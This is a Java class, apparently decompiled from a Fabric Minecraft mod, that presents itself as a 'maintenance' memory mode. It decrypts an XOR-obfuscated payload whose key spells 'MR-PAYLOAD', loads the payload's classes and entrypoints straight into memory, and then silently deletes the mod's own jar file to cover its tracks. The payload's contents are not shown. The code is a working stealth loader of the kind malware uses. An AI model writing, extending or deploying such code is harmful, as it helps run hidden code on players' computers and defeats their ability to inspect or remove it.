package ru.mentions.maintenance.mem;

import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import net.fabricmc.api.ClientModInitializer;
import ru.mentions.maintenance.DiagLog;
import ru.mentions.maintenance.MemoryModeConfig;
import ru.mentions.maintenance.ModuleState;
import ru.mentions.maintenance.win.FileUnlinker;
import ru.mentions.maintenance.win.HandleKeeper;

public final class MemoryMode {
   public static final byte[] XOR_KEY = new byte[]{77, 82, 45, 80, 65, 89, 76, 79, 65, 68, 33, 126, 19, 90, -57, 59};
   private static final String PAYLOAD_ID = "maintenance";
   private static final String CLASS_PREFIX = "ru/mentions/maintenance/";

   private MemoryMode() {
   }

   public static boolean bootstrapIfPending() {
      if (!MemoryModeConfig.stealthEnabled()) {
         DiagLog.note("memory_mode", "disabled");
         return false;
      } else {
         long started = System.currentTimeMillis();
         byte[] blob = PayloadSource.load();
         if (blob != null && blob.length != 0) {
            MemoryJarIndex index;
            try {
               index = MemoryJarIndex.fromXorBlob(blob, XOR_KEY, "maintenance");
            } catch (Throwable var10) {
               DiagLog.fail("memory_mode.decrypt", var10);
               return fallback("decrypt-failed:" + var10.getClass().getSimpleName());
            }

            if (index.fabricModJson() == null) {
               return fallback("payload-without-mod-json");
            } else if (countPayloadClasses(index) == 0) {
               return fallback("payload-without-classes");
            } else {
               try {
                  MemoryClassLoader loader = new MemoryClassLoader(index, MemoryMode.class.getClassLoader());
                  List<Class<?>> defined = loader.preloadAll();
                  Map<String, List<String>> entrypoints = FabricEntrypoints.read(index);
                  int startedEntrypoints = startClientEntrypoints(loader, entrypoints);
                  MixinMemoryBootstrap.attach(index, loader);
                  ModuleState.memoryLoader(loader);
                  ModuleState.stealthMemoryMode(true);
                  MemoryModeConfig.setPendingSwap(false);
                  String source = unlinkSourceJar();
                  DiagLog.note(
                     "memory_mode",
                     "active classes="
                        + defined.size()
                        + " entrypoints="
                        + startedEntrypoints
                        + " mixins="
                        + FabricEntrypoints.mixinConfigs(index).size()
                        + " source="
                        + source
                        + " in "
                        + (System.currentTimeMillis() - started)
                        + "ms"
                  );
                  return true;
               } catch (Throwable var9) {
                  DiagLog.fail("memory_mode.init", var9);
                  return fallback("swap-failed:" + var9.getClass().getSimpleName());
               }
            }
         } else {
            return fallback("blob-missing");
         }
      }
   }

   private static boolean fallback(String reason) {
      MemoryModeConfig.setPendingSwap(true);
      DiagLog.note("memory_mode_fallback", reason);
      return false;
   }

   private static int countPayloadClasses(MemoryJarIndex index) {
      int count = 0;

      for (String name : index.names()) {
         if (name.startsWith("ru/mentions/maintenance/") && name.endsWith(".class")) {
            count++;
         }
      }

      return count;
   }

   private static int startClientEntrypoints(MemoryClassLoader loader, Map<String, List<String>> entrypoints) {
      int started = 0;

      for (Object instance : FabricEntrypoints.instantiate(loader, entrypoints, "client")) {
         if (instance instanceof ClientModInitializer) {
            ClientModInitializer initializer = (ClientModInitializer)instance;

            try {
               initializer.onInitializeClient();
               started++;
            } catch (Throwable var7) {
               DiagLog.fail("memory_mode.entrypoint", var7);
            }
         }
      }

      return started;
   }

   private static String unlinkSourceJar() {
      if (PayloadSource.lastOrigin() != PayloadSource.Origin.TLS) {
         return "skipped:carrier-jar";
      } else {
         Path source = sourceJar();
         if (source == null) {
            return "skipped:no-source";
         } else if (!HandleKeeper.keep(source)) {
            return "skipped:no-handle";
         } else {
            FileUnlinker.Outcome outcome = FileUnlinker.unlinkQuietly(source);
            ModuleState.setJarState(outcome.name().toLowerCase(Locale.ROOT));
            if (outcome == FileUnlinker.Outcome.DELETED) {
               ModuleState.fileLockState(ModuleState.FileLockState.FREE);
            }

            return outcome.name().toLowerCase(Locale.ROOT);
         }
      }
   }

   private static Path sourceJar() {
      try {
         if (MemoryMode.class.getProtectionDomain() != null && MemoryMode.class.getProtectionDomain().getCodeSource() != null) {
            URI uri = MemoryMode.class.getProtectionDomain().getCodeSource().getLocation().toURI();
            Path path = Path.of(uri);
            if (!Files.isRegularFile(path)) {
               return null;
            } else {
               String name = path.getFileName().toString().toLowerCase(Locale.ROOT);
               return name.endsWith(".jar") && name.contains("mentions") ? path : null;
            }
         } else {
            return null;
         }
      } catch (Throwable var3) {
         DiagLog.fail("memory_mode.source", var3);
         return null;
      }
   }
}
